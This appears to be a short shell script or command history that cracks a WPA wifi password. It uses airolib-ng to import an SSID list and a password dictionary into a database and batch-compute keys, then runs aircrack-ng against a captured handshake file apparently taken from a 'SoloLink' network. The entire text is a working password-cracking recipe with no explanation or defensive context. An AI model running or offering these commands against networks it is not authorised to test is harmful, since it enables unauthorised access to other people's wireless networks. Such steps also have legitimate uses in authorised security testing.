airolib-ng SoloLinkDB --import essid SSIDs.txt 
airolib-ng SoloLinkDB --import password dict.txt
airolib-ng SoloLinkDB --clean all
airolib-ng SoloLinkDB --batch
aircrack-ng -r SoloLinkDB ../SoloLink_WPA_handshake.pcap 

